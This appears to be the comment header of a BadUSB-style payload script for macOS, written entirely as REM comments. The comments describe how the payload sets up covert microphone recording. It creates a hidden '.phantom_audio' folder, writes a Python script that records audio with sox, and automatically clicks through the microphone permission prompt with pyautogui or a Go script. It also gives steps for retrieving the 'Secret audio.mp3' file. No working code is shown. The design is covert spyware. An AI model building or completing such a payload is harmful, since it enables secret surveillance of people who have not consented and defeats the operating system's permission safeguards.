REM Creates a hidden folder named .phantom_audio in the home directory.
REM Writes a Python script (record.py) that uses the sox utility 
REM to record audio from the microphone and save it as a .mp3 file. 
REM Will automatically allow the mic permission with pyautogui and cv2 or with golang script

REM Once executed, the audio recording will start and continue until manually stopped
REM You can stop the audio recording by finding the PID and using 'kill pid#'  
REM The recording is saved in the .phantom_audio directory under the home directory

REM To access the audio file easily, you can use the following steps:
REM Open a new Finder window. Go to the "Go" menu in the menu bar and select "Go to Folder"
REM enter "~/.phantom_audio" and click the "Go" button.
REM navigate to the .phantom_audio folder where you can find the "Secret audio.mp3" file.
